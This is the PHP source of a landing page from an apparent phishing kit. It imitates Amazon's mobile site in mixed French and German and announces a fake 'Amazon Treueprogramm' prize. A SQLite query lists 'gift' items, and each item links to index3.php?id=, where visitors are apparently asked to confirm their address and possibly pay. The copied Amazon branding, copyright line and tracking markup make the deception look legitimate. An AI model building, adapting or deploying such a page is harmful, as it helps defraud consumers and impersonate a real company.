<?php
session_start();


   class MyDB extends SQLite3 {
      function __construct() {
         $this->open('addprocdis/db.db');
      }
   }
   $db = new MyDB();
   if(!$db) {
      echo $db->lastErrorMsg();
   } else {
      //echo "Opened database successfully\n";
   }
?>
<html lang="fr-fr" class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser a-ws" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.3-2021-04-29"><!-- sp:feature:head-start --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">


<!-- sp:feature:cs-optimization -->
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://images-eu.ssl-images-amazon.com/">
<link rel="dns-prefetch" href="https://m.media-amazon.com/">
<link rel="dns-prefetch" href="https://completion.amazon.com/">



  

      
      


<!-- akgn7t -->

<!-- sp:feature:aui-assets -->
<link rel="stylesheet" href="./amaz_files/11OrJUma5UL._RC_01rXlRztnIL.css,4135ANpE31L.css,21ak7+1wqPL.css,01uNpa0PcLL.css,01NtHviPbnL.css,01L-6KXabGL.css,310ooOGCdhL.css,11o2wHvvdBL.css,01i9N7e-hBL.css,11VHr91CkuL.css,11ADf9L1OdL.css,01IdKcBuAdL.css,019pz6QNQ6L.css,01wLsDqViEL.css,018gwG6-KML.css">

<!-- sp:feature:cookie-consent-assets -->
<!-- sp:feature:nav-inline-css -->
<!-- NAVYAAN CSS -->
<style type="text/css">
.nav-sprite-v3 .nav-sprite {
  background-image: url(https://www.amazon.fr/images/G/08/gno/sprites/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png);
  background-repeat: no-repeat;
}
.nav-spinner {
  background-image: url(https://www.amazon.fr/images/G/08/javascripts/lib/popover/images/snake._CB485935558_.gif);
}
</style>

<link rel="stylesheet" href="./amaz_files/314xMGKl-SL._RC_41KBYOkTjIL.css,51zszC1muXL.css_.css">
<link rel="stylesheet" href="./amaz_files/41C6LaLLmFL.css">
<link rel="stylesheet" href="./amaz_files/01+72+wCC9L.css">
<link rel="stylesheet" href="./amaz_files/31W7N8gncNL.css">
<!-- sp:feature:host-assets -->





<!--Page Assets-->















<!-- Title of the page is set by SEO meta data -->
<title> Promotions et ventes flash</title>
<meta property="og:title" content=" Promotions et ventes flash">
<meta name="twitter:title" content=" Promotions et ventes flash">

<!-- SEO Meta contents -->
<meta name="description" content="Promotions et Ventes Flash. Les meilleures offres d'Amazon.fr. Tous les jours, retrouvez nos Ventes Flash. Voir conditions des offres sur les pages dédiées.">
<meta property="og:description" content="Promotions et Ventes Flash. Les meilleures offres d'Amazon.fr. Tous les jours, retrouvez nos Ventes Flash. Voir conditions des offres sur les pages dédiées.">
<meta name="twitter:description" content="Promotions et Ventes Flash. Les meilleures offres d'Amazon.fr. Tous les jours, retrouvez nos Ventes Flash. Voir conditions des offres sur les pages dédiées.">

<meta name="keywords" content="">

<link rel="canonical" href="#">

<!--&&&Portal&Delimiter&&&--><!-- sp:end-feature:host-assets -->


<!-- sp:feature:head-close -->

<style>.a2hs-ingress-container,a[href^="#nav-hbm-a2hs-trigger"]{display:none!important}.a2hs-ingress-container.a2hs-ingress-visible,a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible{display:block!important}</style><style>@media all and (display-mode:standalone){#chromeless-view-progress-bar,#chromeless-view-progress-bar::after{position:fixed;top:0;left:0;right:0;height:2px}@keyframes pbAnimation{0%{right:90%}100%{right:10%}}#chromeless-view-progress-bar{background:rgba(255,255,255,.1);z-index:9999999}#chromeless-view-progress-bar::after{content:'';background:#fcbb6a;animation:pbAnimation 10s forwards}}</style><style></style></head><!-- sp:feature:start-body -->
<body class="a-m-fr a-aui_72554-c a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-t1 a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_mm_desktop_exp_291916-t1 a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-t1 a-aui_tnr_v2_180836-c" sip-shortcut-listen="true" style=""><div id="a-page">


<style>
      * { box-sizing: border-box; } body {margin: 0;}*{box-sizing:border-box;max-width:unset;}body{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}#i3ut{display:none;}#id1{background-image:initial;background-position-x:initial;background-position-y:initial;background-size:initial;background-repeat-x:initial;background-repeat-y:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:rgb(19, 25, 33);}#itbu{margin-bottom:0px;padding-top:5px;padding-right:0px;padding-bottom:5px;padding-left:0px;}#i7fv{float:right;padding-right:10px;height:48px;}#content1{color:rgb(19, 25, 33);}#ilpj{display:flex;font-weight:bold;margin-bottom:20px;}#iy5qx{display:block;text-align:center;color:rgb(19, 25, 33);width:313.075px;}#im10b{font-weight:bold;}#timerr{color:rgb(200, 35, 17);}#i9zke{text-align:center;}#p_modal_button1{padding-top:10px;padding-right:30px;padding-bottom:10px;padding-left:30px;}#p_modal_button2{padding-top:10px;padding-right:30px;padding-bottom:10px;padding-left:30px;}#offerlink{display:block;padding-top:10px;padding-right:30px;padding-bottom:10px;padding-left:30px;}#i07gw6{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;float:left;display:block;width:50%;}#iy4clm{color:rgb(59, 89, 152);}#iq2fzg{margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;float:right;display:block;width:50%;color:rgb(168, 167, 167);text-align:right;}#iw30ou{clear:both;}#comment0{display:block;}#comment1{display:block;}#comment2{display:block;}#comment3{display:block;}#comment4{display:block;}#comment5{display:block;}#comment5-2{display:block;}#comment6{display:block;}#comment7{display:block;}#comment7-2{display:block;}#comment8{display:block;}#i6u6kn{font-size:12px;color:rgb(188, 188, 188);}#p_loading{display:none;}#i61hqa{margin-top:0px;margin-right:auto;margin-bottom:0px;margin-left:auto;}#ite0vq{display:none;}#footer{background-color:rgb(13, 20, 30);margin-bottom:0px;font-size:12px;text-align:center;color:rgb(239, 239, 239);}#i5905i{padding-top:20px;padding-right:20px;padding-left:20px;padding-bottom:0px;}#i1vb5m{line-height:40px;margin-bottom:0px;}
    </style>
    



<!-- sp:feature:nav-inline-js -->
<!-- NAVYAAN JS -->

<img src="./amaz_files/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png" style="display:none" alt="">



<!-- sp:feature:nav-skeleton -->
<!-- sp:feature:navbar -->

  <!-- NAVYAAN -->





<!-- MOBILE-APP-BANNER -->





<!--NAVYAAN-UPNAV-MARKER-->

<!-- navmet initial definition -->





    <style mark="aboveNavInjectionCSS" type="text/css">
      #nav-gwbar .nav-a { white-space: nowrap; } .nav-input[type='submit'] {opacity: 0.01;}
    </style>










<!--NAVYAAN-MOBILEPRENAV-MARKER-->


  <!-- NAVYAAN -->




<header id="nav-main" data-nav-language="fr_FR" class="nav-mobile nav-progressive-attribute nav-locale-fr nav-lang-fr nav-ssl nav-unrec nav-blueheaven">
    
    <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-standard nav-sprite-v3 celwidget" data-csa-c-id="ch7mtj-1jo5se-q4c2dt-i0f0sr" data-cel-widget="Navigation-mobile-navbar">
        <div id="nav-logobar">
            <div class="nav-left">
                
                
  <a href="javascript: void(0)" id="nav-hamburger-menu" role="button" aria-label="Ouvrir le menu" data-csa-c-id="fa583m-27ksfs-fhtp8u-chq2ws">
    <i class="nav-icon-a11y nav-sprite"></i>
  </a>
  


  
      

                
                
  <div id="nav-logo">
    <a href="#" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon.fr">
      <span class="nav-sprite nav-logo-base"></span>
      <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
      <span class="nav-logo-locale">.de</span>
    </a>
  </div>

            </div>
            <div class="nav-right">
                
                
<a href="#" id="nav-logobar-greeting" class="nav-a nav-show-sign-in">
    Amazon.de ›
</a>

                
                 
  <a href="#" class="nav-a avatar-new  avatar-wide" id="nav-button-avatar" aria-label="votre compte">
    <i class="nav-icon nav-icon-a11y nav-sprite">votre compte</i>
    
  </a>
 
  <a href="#" aria-label="Cart" class="nav-a" id="nav-button-cart">
    <div id="cart-size" class="nav-cart-0 nav-progressive-attribute">
      <span class="nav-icon nav-sprite">
        <span id="nav-cart-count" class="nav-cart-count nav-progressive-content">0</span>
      </span>
    </div>
  </a>

            </div>
        </div>
        

        
        
  <div class="nav-progressive-attribute" id="search-ac-init-data" data-aliases="aps,amazon-devices,amazonfresh,monoprix,naturalia,truffaut,stripbooks,audible,popular,dvd,electronics,videogames,toys,english-books,kitchen,luggage,classical,vhs,software,jewelry,watches,music-song,music-title,music-artist,mp3-downloads,digital-music,digital-music-track,digital-music-album,digital-text,lighting,baby,beauty,hpc,office-products,shoes,sports,mi,computers,clothing,appliances,diy,mobile-apps,pets,gift-cards,automotive,vehicles,garden,tradein-aps,handmade,handmade-jewelry,handmade-home-and-kitchen,warehouse-deals,grocery,luxury-beauty,banjo-apps,industrial,instant-video,black-friday,cyber-monday,fashion,alexa-skills,under-ten-dollars,todays-deals,specialty-aps-sns,luxury" data-ime="" data-mkt="5" data-src="completion.amazon.co.uk/search/complete">
  </div>
  <div id="nav-search-keywords-data" class="nav-progressive-attribute" data-implicit-alias="goldbox">
  </div>
  <div class="nav-searchbar-wrapper">
    <form class="nav-searchbar search-big" action="https://www.amazon.fr/gp/aw/s/ref=nb_sb_noss" method="get" role="search" id="nav-search-form" accept-charset="utf-8">
      <div class="nav-fill">
        <div class="nav-search-field">
          <input type="text" class="nav-input nav-progressive-attribute" placeholder="Suche Amazon.de" data-aria-clear-label="Effacer les mots-clés de recherche" name="k" autocomplete="off" autocorrect="off" autocapitalize="off" dir="auto" value="" id="nav-search-keywords">
        <a class="nav-icon nav-sprite nav-search-clear" tabindex="0" href="javascript:;" aria-label="Effacer les mots-clés de recherche"></a></div>
      </div>
      <div class="nav-right">
        <div class="nav-search-submit">
          <input type="submit" class="nav-input" value="Go" aria-label="Go">
          <i class="nav-icon nav-sprite"></i>
        </div>
      </div>
    </form>
  </div>

        

        
        
        

        

        
        
        <!--NAVYAAN-SUBNAV-AND-SMILE-FROM-GURUPA-->
        
<!-- NAVYAAN-GLOW-SUBNAV -->
<div class="glow-subnav-template glow-mobile-subnav" id="nav-subnav-container">
    <div class="a-declarative" data-action="glow-sheet-trigger" id="nav-global-location-slot">
        <div class="nav-sprite" id="nav-packard-glow-loc-icon"></div>
        <div id="glow-ingress-block">
            <span class="nav-single-line nav-persist-content" id="glow-ingress-single-line">
                Wählen Sie Ihr Geschenk und bestätigen Sie Ihre Lieferadresse
            </span>
        </div>
        <input data-addnewaddress="new" id="unifiedLocation1ClickAddress" name="addressID" type="hidden" class="nav-progressive-attribute" value="">
        <input id="glowValidationToken" name="glow-validation-token" type="hidden" value="gIB/wn0qIW7vEck+9/MwYFaqLY1cjeMFunW579kAAAAMAAAAAGCOBIpyYXcAAAAA" class="nav-progressive-attribute">
    </div>
</div>




        
    </div>
    
    
    <div id="nav-progressive-subnav">
      
    </div>
</header>








<!-- sp:feature:host-atf -->



















    
    
        <div></div>
    









    













    
    
        <div>
                <div class="a-section a-spacing-none a-padding-medium">
                    <h2 style="text-align: center;" class="a-size-extra-large a-spacing-micro">Amazon Treueprogramm</h2><h1 class="a-size-extra-large a-spacing-micro">Herzliche Glückwünsche !</h1>
                    <span class="a-size-base">Beeilen Sie sich, die Anzahl der auf Lager verfügbaren Geschenke ist begrenzt!

<br><br><span class="a-size-base">Bitte fügen Sie Ihre Auswahl dem Korb hinzu und bestätigen Sie Ihre Lieferadresse, um Ihr Geschenk innerhalb von 2 bis 3 Werktagen zu erhalten.




.</span>
                </span></div><br>
            </div>
    







    
    
     
            </div><br><br><div style="text-align: center;" class="zg_item zg_homeWidgetItem">
        <ul>

                              <?php

   $sql ="SELECT * from user  ORDER BY orderid  ";

   $ret = $db->query($sql);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {

  ?>
    <li style="
    width: 300px;
    float: left;
    display: inline;
    list-style-type: none;
    margin-right: 32px;
    margin-bottom: 20Px;    height: 350px;
">
<div style="text-align: center;" class="zg_rankInfo">
      
      
    
        <div style="text-align: center;width: 300px;" data-p13n-asin-metadata="{&quot;ref&quot;:&quot;zg_bs_electronics_home_1&quot;,&quot;asin&quot;:&quot;B07PZR3PVB&quot;}" class="a-section a-spacing-none p13n-asin">
            <a class="a-link-normal" href="index3.php?id=<?php echo $row['IP']?>"><div class="a-section a-spacing-mini"><img alt="Apple AirPods avec boîtier de charge filaire" src="<?php echo $row['image'] ?>" class="a-dynamic-image p13n-sc-dynamic-image" height="160" width="160" ></div>
        <div style="    height: 100Px;" class="p13n-sc-truncate-desktop-type2 p13n-sc-truncated" aria-hidden="true" data-rows="5"><?php echo $row['nom'] ?>
          <br>
          <span class="a-list-item">






<span class="sc-price-with-prime">




<span class="a-size-base a-color-price sc-white-space-nowrap sc-product-price sc-price-sign" style="text-decoration: line-through;">
<?php echo $row['prix'] ?>&nbsp;€<br>

</span>
<span style="color: #4caf50;">Auf Lager</span>
</span>

</span>
        </div>
    </a>
            
        <div class="a-icon-row a-spacing-none">
            <a class="a-link-normal" title="4,7 von 5 Sternen" href="index3.php?id=<?php echo $row['IP']?>">
                <i class="a-icon a-icon-star a-star-4-5 aok-align-top"><span class="a-icon-alt">4,7 von 5 Sternen</span></i>
            </a>
            <a class="a-size-small a-link-normal" href="index3.php?id=<?php echo $row['IP']?>"></a>
        </div><br><p style="text-align: center;"><a href="index3.php?id=<?php echo $row['IP']?>"><img src="butt.png" alt="" width="250"></a></p>
    
        </div>
    </div>
    </li>
                                 <?php

   }
   $db->close();


  ?>

</ul></div>
    



    



    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    

























    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    



    



    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    





    













    
    
        
    









  <div style="text-align: center;visibility: hidden;/* height: 400px; */" class="zg_item zg_homeWidgetItem">
        <ul>
    <li style="
    width: 300px;
    /* float: left; */
    display: inline;
    list-style-type: none;
">
<div style="text-align: center;" class="zg_rankInfo">
      
      
    
        <div style="text-align: center;width: 300px;" data-p13n-asin-metadata="{&quot;ref&quot;:&quot;zg_bs_electronics_home_1&quot;,&quot;asin&quot;:&quot;B07PZR3PVB&quot;}" class="a-section a-spacing-none p13n-asin">
            <a class="a-link-normal" href="#"><div class="a-section a-spacing-mini"><img alt="Apple AirPods avec boîtier de charge filaire" src="./amaz_files/71NTi82uBEL._AC_UL480_SR480,480_.jpg" class="a-dynamic-image p13n-sc-dynamic-image" height="160" width="160" data-a-dynamic-image="{&quot;https://www.amazon.fr/images/I/71NTi82uBEL._AC_UL160_SR160,160_.jpg&quot;:[160,160],&quot;https://www.amazon.fr/images/I/71NTi82uBEL._AC_UL320_SR320,320_.jpg&quot;:[320,320],&quot;https://www.cdiscount.com/pdt2/2/8/g/1/300x300/samgalaxs21128g/rw/samsung-galaxy-s21-128go-gris.jpg&quot;:[480,480]}"></div>
        <div class="p13n-sc-truncate-desktop-type2 p13n-sc-truncated" aria-hidden="true" data-rows="5">Samsung Galaxy S21 Téléphones Dual SIM, Samsung Samsung SM-G991B Galaxy (82)</div>
    </a>
            
        <div class="a-icon-row a-spacing-none">
            <a class="a-link-normal" title="4,7 von 5 Sternen" href="#">
                <i class="a-icon a-icon-star a-star-4-5 aok-align-top"><span class="a-icon-alt">4,7 von 5 Sternen</span></i>
            </a>
            <a class="a-size-small a-link-normal" href="#">97&nbsp;306</a>
        </div><br><p style="text-align: center;"><a href="https://google.com"><img src="butt.png" alt="" width="250"></a></p>
    
        </div>
    </div>
    </li>
</ul></div><!-- NAVYAAN FOOTER START -->

<footer class="nav-mobile nav-ftr-batmobile">
  
  <div id="nav-ftr" class="nav-t-footer-gateway nav-sprite-v3">
    
<a id="nav-ftr-gototop" class="nav-a" href="" aria-label="Haut de la page">
  <i class="nav-icon"></i>
  <b class="nav-b">
    Ganz oben auf der Seite
  </b>
</a>

    
    
<ul id="nav-ftr-links" class="nav-ftr-links-two-column">
  
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Kehrt zurück
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Kundendienst
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Ihr Konto
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Ihre Listen

        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Finde eine Liste
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Finde ein Geschenk
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Artikel, die Sie kürzlich angesehen haben
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Laden Sie die Amazon App herunter
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Recycling (einschließlich elektrischer und elektronischer Geräte)
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li nav-li-right">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Amazon Desktop-Site
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
        Amazon.de Homepage
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Bei Ihnen zu Hause
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Ihre Befehle
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Verkaufen
auf Amazon
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Werden Sie Amazon Business-Kunde
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Verkaufen Sie bei Amazon Business
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Informationen auf unserem Marktplatz
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Verwalte Deine Abonnements
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
          1-Klicken Sie auf Kontaktdaten
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>
    <li class="nav-li ">
      <a class="nav-a " href="">
        <span class="nav-ftr-text">
          Barrierefreiheit
        </span>
        <i class="nav-icon nav-sprite"></i>
      </a>
    </li>

  
</ul>

    
    
  <div id="nav-ftr-auth">
   Schon Kunde ?<a href="" class="nav-a">Einloggen</a>
  </div>

    
    
<ul class="nav-ftr-horiz">
    <li class="nav-li">
      <a href="" class="nav-a">Verkaufsbedingungen</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Teilnahmebedingungen für das Marketplace-Programm</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Ihre persönliche Information</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Kekse</a>
    </li>
    <li class="nav-li">
      <a href="" class="nav-a">Anzeigen basierend auf Ihren Interessen</a>
    </li>
</ul>

<div id="nav-ftr-copyright">
© 1996-2021 Amazon.com, Inc.
</div>

  </div>
</footer>

<div id="sis_pixel_r2" aria-hidden="true" style="height:1px; position: absolute; left: -1000000px; top: -1000000px;"><iframe id="DAsis" src="./amaz_files/iu3.html" width="1" height="1" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></div>

  <!-- NAVYAAN FOOTER END -->
<!-- sp:feature:amazon-pay-iframe -->
<!-- sp:end-feature:amazon-pay-iframe -->
<div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="https://www.amazon.fr/gp/get"><input type="hidden" name="ue_back" value="2"></form>




</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.fr/1/batch/1/OP/A13V1IB3VIYZZH:260-5009389-6389045:9BF906ASS174V2KTZD4M$uedata=s:%2Frd%2Fuedata%3Fnoscript%26id%3D9BF906ASS174V2KTZD4M:0' alt=""/>
</noscript>


</div><div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
<!--       _
       .__(.)< (MEOW)
        \___)   
 ~~~~~~~~~~~~~~~~~~-->
<!-- sp:eh:SxCjgK3ljQ1oC+34tVXvizMgbYo39lQjK9peUsNj3q1NBAphKaumyNr8J2wSRbTcTFQN/kkxYRrxeA6sNCMrpD3tD5k9WOtMUBoTnU6T0Z8OiqfnXKPfR323XP0= -->
<div id="a-white"></div>



        
        
        




  <!--NAVYAAN-HMENU-AJAX-->

<div id="hmenu-container" cel_widget_id="Navigation-mobile-HamburgerMenu" style="display: block;" class="celwidget nav-sprite-v3" data-csa-c-id="ib9qf7-4boo2o-9xj8kj-28rn7u" data-cel-widget="Navigation-mobile-HamburgerMenu">
  <div id="hmenu-canvas-background" class="hmenu-transparent hmenu-dark-bkg-color">
    <div class="nav-sprite hmenu-close-icon"></div>
  </div>
  <div id="hmenu-canvas" class="hmenu-translateX-left nav-ignore-pinning">
    
    
    <div id="hmenu-content">
      

<a id="hmenu-close-menu" class="hmenu-hidden-link" href="javascript:void(0)">
  <div>Menü schließen</div>
</a>
<ul class="hmenu header-enabled" data-menu-id="1">
<li>
<div id="hmenu-header">
    <div id="hmenu-header-top">
        <a id="hmenu-header-account" data-recognized="0" href="">
            <div id="hmenu-header-account-text">Identifizieren Sie sich</div>
            <div id="hmenu-header-account-icon" class="nav-sprite"></div>
        </a>
    </div>
    <div id="hmenu-header-bottom">
      <a id="hmenu-header-title" href="">
          <div id="hmenu-header-title-line1">Durchsuche</div>
          <div id="hmenu-header-title-line2">Amazon</div>
      </a>
    </div>
</div>
</li>
<li>
<a id="hmenu-home-link" href="">
    <div id="hmenu-home-container">
        <div id="hmenu-home-left">
            <div id="hmenu-home-text">Amazon Homepage</div>
        </div>
        <div id="hmenu-home-right">
            <div id="hmenu-home-icon" class="nav-sprite"></div>
        </div>
    </div>
</a>
</li>
<li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">Trends</div></li><li><a href="" class="hmenu-item">Meilleures Ventes</a></li><li><a href="" class="hmenu-item">Neuesten Nachrichten</a></li><li><a href="" class="hmenu-item">Verkaufsbarometer</a></li><li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">besten Kategorien</div></li><li><a href="" class="hmenu-item">Küche und Zuhause</a></li><li><a href="" class="hmenu-item">Informatik</a></li><li><a href="" class="hmenu-item">Bücher</a></li><li><a href="" class="hmenu-item">Hightech</a></li><li><a href="" class="hmenu-item" data-menu-id="2" data-ref-tag="navm_em_1_1_1_10"><div>Alle unsere Kategorien</div><i class="nav-sprite hmenu-arrow-next"></i></a></li><li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">Programme und Dienstleistungen</div></li><li><a href="" class="hmenu-item">Flash-Verkäufe und Werbeaktionen
</a></li><li><a href="" id="nav-link-prime" class="hmenu-item">Probieren Sie Amazon Prime aus</a></li><li><a href="" id="video" class="hmenu-item">Prime Video</a></li><li><a href="" id="music" class="hmenu-item">Amazon Music
</a></li><li><a href="" class="hmenu-item" data-menu-id="3" data-ref-tag="navm_em_1_1_1_16"><div>Alle Programme anzeigen
</div><i class="nav-sprite hmenu-arrow-next"></i></a></li><li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">Hilfe und Einstellungen</div></li><li><a href="" class="hmenu-item">Koto</a></li><li><a href="" class="hmenu-item">Commandes</a></li><li><a href="" class="hmenu-item">Listen</a></li><li><a href="" class="hmenu-item">Kundendienst</a></li><li><a class="hmenu-item" onclick="$Nav.getNow(&#39;signInRedirect&#39;)(&#39;navm_em_hd_re_signin&#39;, &#39;https://www.amazon.fr/ap/signin?openid.assoc_handle=anywhere_v2_fr&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.mode=checkid_setup&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.fr%2Fgp%2Fyourstore%2Fhome%2F%3Fie%3DUTF8%26ref_%3Dnavm_em_hd_re_signin&amp;ref_=navm_em_hd_clc_signin_0_1_1_22&#39;, &#39;navm_em_hd_clc_signin_0_1_1_22&#39;)">Einloggen</a></li>
</ul>

    </div>
    <a id="hmenu-back-to-top" class="hmenu-hidden-link nav-side-menu-back-to-top" href="javascript:void(0)"><div>Seitenanfang</div></a>
  </div>
</div>
<!--NAVYAAN-HMENU-AJAX-END--></body></html>